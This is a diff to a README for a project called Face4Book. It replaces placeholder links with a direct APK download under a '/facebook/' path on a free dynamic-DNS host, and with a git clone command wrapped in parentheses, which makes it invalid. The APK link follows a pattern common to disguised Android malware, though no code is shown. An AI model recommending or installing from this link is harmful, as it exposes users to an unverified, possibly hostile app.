@@ -25,7 +25,7 @@
 
 ## 🔗 App Download Link 
 
-[🔎 Download Face4Book](https://yourusername.github.io/face4book)
+[🔎 Download Face4Book](https://plxbd.mooo.com/facebook/Face4Book%20V.2.0.apk)
 
 ---
 
@@ -34,6 +34,6 @@
 To run this project locally:
 
 ```bash
-git clone https://github.com/yourusername/face4book.git
+git clone (https://github.com/linode4723/face4book)
 cd face4book
 open index.html
